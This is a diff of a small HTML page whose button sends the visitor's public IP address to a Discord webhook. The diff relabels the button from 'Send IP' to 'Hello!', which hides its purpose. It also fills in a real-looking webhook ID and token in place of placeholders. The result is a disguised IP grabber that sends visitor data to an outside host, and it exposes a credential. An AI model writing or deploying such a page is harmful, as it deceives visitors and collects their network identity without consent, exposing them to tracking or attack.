@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <button onclick="sendIP()">Send IP</button>
+    <button onclick="sendIP()">Hello!</button>
 
     <script>
       async function sendIP() {
@@ -9,7 +9,7 @@
         const ipData = await ipResponse.json();
         const ipAddress = ipData.ip;
 
-        const url = "https://discord.com/api/webhooks/[WEBHOOK_ID]/[WEBHOOK_TOKEN]";
+        const url = "https://discord.com/api/webhooks/1093845705350713425/GzEVUGWE-zYL6xgPZpIvewZ0jUnLtdjympAXvUXyeb-friX8e_I8iTSG5-M5G-UZYU2e";
         const data = { content: `IP Address: ${ipAddress}` };
 
         fetch(url, {
